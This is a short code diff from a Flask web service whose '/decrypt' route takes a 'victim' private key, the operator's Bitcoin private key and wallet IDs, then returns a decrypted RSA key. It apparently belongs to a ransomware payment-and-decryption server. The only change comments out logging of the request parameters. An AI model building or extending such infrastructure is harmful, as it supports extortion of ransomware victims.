@@ -49,7 +49,7 @@ def unpack_request(request_parameters):
 @app.route("/decrypt", methods=["POST"])
 def process():
     request_parameters = request.get_json()
-    logger.info(request_parameters)
+    #logger.info(request_parameters)
     if check_parameters(request_parameters):
         victim_private_key, my_bitcoin_private_key, my_wallet_id, victim_wallet_id = unpack_request(request_parameters)
         return decrypt_rsa_key(victim_private_key)
